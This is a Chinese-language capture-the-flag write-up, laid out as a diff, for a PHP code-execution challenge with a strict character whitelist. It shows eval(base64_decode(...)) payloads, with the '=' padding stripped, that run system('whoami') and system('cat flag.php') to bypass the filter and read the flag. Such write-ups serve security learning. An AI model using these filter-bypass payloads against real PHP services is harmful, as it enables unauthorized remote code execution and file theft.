@@ -1,1 +1,117 @@
+一句话木马变形 - WriteUp
+题目信息
+项目	内容
+题目名称	一句话木马变形
+题目类型	Web - 代码执行
+考点	PHP 版本探测、PHP 7.3特性、Base64编码绕过、字符限制绕过、RCE
+难度	⭐⭐
+题目描述
+题目提供了一个在线 PHP 代码执行环境，用户可以在输入框中输入 PHP 代码并执行。但题目对输入做了严格的字符限制：
 
+只允许输入：字母、数字、下划线、括号、分号
+
+其他字符（引号、点号、斜杠、美元符号、方括号、逗号、空格等）均会被拦截。
+
+目标：读取服务器上的 flag 文件。
+
+解题过程
+第一步：探测 PHP 版本
+执行：
+
+text
+phpversion();
+或者：
+
+text
+PHP_VERSION;
+或者查看完整环境信息：
+
+text
+phpinfo();
+从 phpinfo() 输出中发现：
+
+text
+PHP Version 7.3.29
+确认目标环境为 PHP 7.3.29。
+
+这个版本的关键特性：使用未定义的常量时，PHP 不会报致命错误，而是发出警告并将其当作字符串处理。这为后续绕过提供了可能。
+
+第二步：查看目录结构
+执行：
+
+text
+scandir(__DIR__)
+结果：
+
+text
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => flag.php
+    [3] => index.php
+)
+发现目标文件 flag.php 就在当前目录下。
+
+第三步：尝试直接读取
+尝试读取 flag.php：
+
+text
+show_source(flag.php)
+报错：Invalid characters detected! —— flag.php 中的点号 . 是不允许的字符。
+
+尝试用引号包裹：
+
+text
+show_source('flag.php')
+同样报错，单引号 ' 也不在允许列表中。
+
+由于字符限制，无法直接写出 flag.php 这个文件名。
+
+第四步：Base64 编码绕过
+既然无法直接写出包含非法字符的代码，可以将代码先进行 Base64 编码，然后解码执行。
+
+测试命令执行：
+
+首先测试 system("whoami")，确认命令执行功能可用。
+
+原始代码：
+
+php
+system("whoami");
+Base64 编码（去掉末尾的 = 填充符，因为 = 也不在允许字符中）：
+
+text
+c3lzdGVtKCJ3aG9hbWkiKTs
+最终 Payload：
+
+text
+eval(base64_decode(c3lzdGVtKCJ3aG9hbWkiKTs))
+执行结果：
+
+text
+www-data
+成功！说明：
+
+eval() 和 base64_decode() 可用
+
+system() 函数可用
+
+Base64 编码绕过有效
+
+第五步：读取 flag
+用 system() 执行 cat flag.php：
+
+原始代码：
+
+php
+system("cat flag.php");
+Base64 编码：
+
+text
+c3lzdGVtKCJjYXQgZmxhZy5waHAiKTs
+最终 Payload：
+
+text
+eval(base64_decode(c3lzdGVtKCJjYXQgZmxhZy5waHAiKTs))
+执行后成功读取 flag 文件内容。
